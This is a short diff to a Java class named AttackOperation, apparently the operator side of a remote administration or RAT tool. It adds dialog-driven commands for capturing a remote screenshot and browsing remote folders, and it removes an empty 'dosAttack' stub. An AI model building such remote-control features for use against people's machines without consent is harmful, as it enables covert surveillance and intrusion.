@@ -13,11 +13,25 @@ public class AttackOperation {
 		send = JOptionPane.showInputDialog(j,str);;
 		dout.writeUTF(send);
 		recive = din.readUTF();
-		System.out.println(recive);		
+		JOptionPane.showMessageDialog(j, recive);		
 	}
 	
 	
-	public static void dosAttack(){
+	public static String screenshot(JFrame j){
+		
+		String str = "Enter the path to store the screenshot :\nExample = D:\\Shot.jpg";
+		send = JOptionPane.showInputDialog(j,str);;
+		return "path`"+send; 
+		
+		
+	}
+	
+	public static String fileExplore(JFrame j){
+		
+		String str = "Enter the command to explore :\nExamples:\n cd = change folder directory\n dir = list items";
+		send = JOptionPane.showInputDialog(j,str);;
+		return "dir`"+send; 
+		
 		
 	}
 	
